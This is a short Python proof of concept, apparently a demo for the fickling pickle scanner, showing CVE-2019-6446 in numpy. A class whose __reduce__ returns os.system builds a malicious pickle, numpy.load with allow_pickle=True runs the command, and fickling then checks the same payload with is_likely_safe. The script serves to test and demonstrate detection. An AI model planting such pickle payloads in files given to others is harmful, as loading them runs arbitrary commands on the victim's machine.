# This PoC has been adapted from https://snyk.io/vuln/SNYK-PYTHON-NUMPY-73513 (CVE-2019-6446)

import numpy
import os
import pickle
from fickling.pickle import Pickled


class Test(object):
    def __init__(self):
        self.a = 1

    def __reduce__(self):
        # Runs the other PoC found in /examples
        return (os.system, ("python pytorch_poc.py",))


payload = Test()


print("\n\nWithout fickling\n\n")

with open("a-file.pickle", "wb") as f:
    pickle.dump(payload, f)

# The original PoC used an earlier version where allow_pickle was True by default
numpy.load("a-file.pickle", allow_pickle=True)


print("\n\nWith fickling\n\n")

fickled_payload = Pickled.load(pickle.dumps(payload))

print("\n\nIs this is_likely_safe?")

safety = fickled_payload.is_likely_safe

if safety is False:
    print("❌")
else:
    print("✅")
